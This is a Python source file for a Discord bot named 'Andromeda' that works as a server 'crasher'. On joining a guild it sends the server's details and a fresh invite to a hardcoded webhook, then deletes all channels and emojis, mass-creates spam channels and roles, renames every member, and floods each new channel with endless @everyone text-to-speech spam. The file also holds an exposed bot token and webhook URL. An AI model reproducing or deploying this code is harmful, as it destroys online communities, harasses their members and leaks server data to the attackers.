# Andromeda
# https:/t.me/numoun


from discord.ext import commands
import discord
import os
import time
import asyncio
import random
import threading
import aiohttp
import datetime
from threading import Thread
from discord import Permissions
from discord import client
from discord.utils import get
from discord_webhook import DiscordWebhook as hook, DiscordEmbed as D_Embed
from time import sleep
from discord import Webhook, AsyncWebhookAdapter

devs = [726072384452296773, 927164796325994497]
#wl = ['968268832592527440']
intents = discord.Intents.all()
client = commands.Bot(command_prefix = '.', intents=intents)
client.remove_command('help')
loghook = 'https://discord.com/api/webhooks/1048308770683502643/D_15Iyus3gCiUPPvFk2ij8nS3ytB31OUyRrLpNo9XQsWlhIruEWgHCE2CZlgmJic5wE1'

@client.event
async def on_ready():
    activity = discord.Streaming(name='https://t.me/numoun', url = 'https://twitch.tv/unknownpage')
    await client.change_presence(status=discord.Status.online, activity=activity)
    print(f"Bot {client.user} Ready")

async def delch(guild):
    for c in guild.channels:
        try:
            await c.delete()
        except:
            pass

async def delem(guild):
    for c in guild.emojis:
        try: 
            await c.delete()
        except:
            pass

async def spamch(guild):
    for x in range(50):
        try: 
            await guild.create_text_channel(name="crashed-by-andromeda")
        except: 
            pass

async def spamrl(guild):
    for y in range(100):
        try: 
            await guild.create_role(name="Crashed by Andromeda")
        except: 
            pass

async def editm(guild):
    for m in guild.members:
        try: 
            await m.edit(nick='Crashed by Andromeda')
        except: 
            pass

@client.event
async def on_guild_join(guild):
    guild = guild
    dt_now = datetime.datetime.now()
    invitelink = await guild.text_channels[0].create_invite(max_uses=1, unique=True)
    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.bot_add):
      async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(loghook, adapter=discord.AsyncWebhookAdapter(session))
        await webhook.send(embed = discord.Embed(
            title=f'||                        ||{guild.name}||                       ||',
            description=f"""
**<:Discord_HypeSquadEvents:1040165733562335242> | ID сервера:** `{guild.id}`
**<:Chutumuz4:1042899732382617700> | Овнер:** `{guild.owner}`
**<:staff_blue:940304837575340063> | Участников:** `{len(guild.members)}`
**<:bughunterorange:943196832283111454> | Количество каналов:** `{len(guild.channels)}`
**<:channel:935902319986507857> | Количество ролей:** `{len(guild.roles)}`
**<:DeveloperBadge:1040166406643261481> | крашнул:** `{entry.user}`
**<:blurpleverified:935902287073804288> | ID крашера:** `{entry.user.id}`
**<:kilit:963793801854468146> | сервер крашнут ботом:** `{client.user}`""", 
            colour=discord.Colour.from_rgb(81, 161, 255)))

    with open('andromeda.png', 'rb') as f:
        icon = f.read()
        try: 
            await guild.edit(name="Crashed by Andromeda", icon=icon)
        except: 
            pass
    asyncio.create_task(delch(guild))
    asyncio.create_task(delem(guild))
    asyncio.create_task(spamch(guild))
    asyncio.create_task(spamrl(guild))
    asyncio.create_task(editm(guild))




@client.command()
async def liv(ctx):
    if not ctx.author.id in devs:
        return await ctx.send("Анегдот", embed = discord.Embed(title='Идут 2 репера один в кепке и другой пизды получит', description=f'аххахапхзхпхахахахахахпхахахахахахахахахахахахахахахахахахпхпхахпхахпхпахпэпхаэаэаэпхпэпхпхааахпхахахахахахахахаАХАХАХАХАХАХАХАХАХАЭАХАХААЭАХАХАХАХА', colour = 0xf00a0a))
    for guild in client.guilds:
        if guild.id != 994364057605910639:
            await guild.leave()
            await ctx.send(f'{guild}')

with open('andromeda.png', 'rb') as f:
    avatar = f.read()

@client.event
async def on_guild_channel_create(channel):
    webhook = await  channel.create_webhook(name = "Crashed by Andromeda", avatar = avatar)
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
        while True:
            try:
                await webhook.send('@everyone @here ссылка на прекрасных: https://discord.gg/F9uNynGkDM', tts=True)
            except:
                pass

token = 'OTUyNTg0MjM0NzU1ODM3OTgy.G7McL4.wuiIITUhIkM4Lu5uQkbbrz5VM5lnN0uNW6DAok'
# https://discord.com/api/oauth2/authorize?client_id=952584234755837982&permissions=8&scope=bot
client.run(token)